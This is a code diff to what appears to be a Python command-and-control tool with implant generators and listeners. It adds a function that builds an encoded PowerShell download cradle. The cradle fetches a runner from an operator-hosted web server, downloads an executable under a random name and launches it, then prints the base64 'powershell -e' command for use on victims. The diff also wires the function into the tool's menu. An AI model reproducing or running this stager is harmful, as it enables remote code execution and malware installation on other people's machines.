@@ -7,6 +7,7 @@ import string
 import subprocess
 import threading
 import time
+import base64
 from datetime import datetime
 
 from prettytable import PrettyTable
@@ -213,6 +214,25 @@ def exeplant():
     else:
         print("[-] Some error occured during generation.")
 
+def pshell_cradle():
+    web_server_ip = input('[+] Web server listening host:')
+    web_server_port = input('[+] Web server port:')
+    payload_name = input('[+] Payload name:')
+    runner_file = (''.join(random.choices(string.ascii_lowercase, k=6)))
+    runner_file = f'{runner_file}.txt'
+    randomised_exe_file = (''.join(random.choices(string.ascii_lowercase, k=6)))
+    randomised_exe_file = f'{randomised_exe_file}.exe'
+    print(f'[+] Run the following command to start a web server.\npython3 -m http.server -b {web_server_ip} {web_server_port}')
+    runner_cal_unencoded = f"iex (new-object net.webclient).downloadingstring('http://{web_server_ip}:{web_server_port}/{runner_file}')".encode('utf-16le')
+    with open(runner_file, 'w') as f:
+        f.write(f'powershell -c wget http://{web_server_ip}:{web_server_port}/{payload_name} -outfile {randomised_exe_file}; Start-Process -FilePath {randomised_exe_file}')
+        f.close()
+    b64_runner_cal = base64.b64encode(runner_cal_unencoded)
+    b64_runner_cal = b64_runner_cal.decode()
+    print(f'\n[+] Encoded payload\npowershell -e {b64_runner_cal}')
+    b64_runner_cal_decoded = base64.b64decode(b64_runner_cal).decode()
+    print(f'\n[+] Unencoded payload\n[{b64_runner_cal_decoded}')
+
 
 if __name__ == "__main__":
     targets = []
@@ -228,6 +248,8 @@ if __name__ == "__main__":
                 host_port = input("[+] Enter the port to listen on: ")
                 listener_handler()
                 listener_counter += 1
+            if command == 'pshel_shell':
+                pshell_cradle()
             if command == "winplant py":
                 if listener_counter > 0:
                     winplant()
